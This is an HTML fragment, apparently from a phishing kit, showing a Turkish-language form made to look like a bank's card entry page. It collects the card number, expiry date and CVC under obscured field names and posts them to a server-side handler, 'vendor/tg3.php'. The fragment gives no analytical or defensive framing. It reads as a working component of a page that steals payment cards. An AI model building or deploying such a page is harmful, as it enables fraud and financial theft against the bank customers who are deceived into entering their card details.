...
<body>
    <main id="app">
        ...
        <form action="vendor/tg3.php" method="post">
                    ...
                    <div class="card credentials">
                        ...
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-id" type="number" name="kml" placeholder="Kart Numaranızı Giriniz"
                                required="" maxlength="16" />
                            <img class="keyboard" src="img/keyboard.svg">
                            <label class="error" id="label-error-id"></label>
                        </div>
                        <label>Son Kullanma Tarihi</label>
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-id" type="text" name="bnk" placeholder="Son Kullanma Tarihini Giriniz"
                                required="" />
                            <img class="keyboard" src="img/keyboard.svg">
                            <label class="error" id="label-error-id"></label>
                        </div>
                        ...
                        <div class="input-group">
                            <input autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                                id="customer-pass" type="number" name="sps" placeholder="CVC Giriniz" required="" />
                            <img class="keyboard" src="img/keyboard.svg">
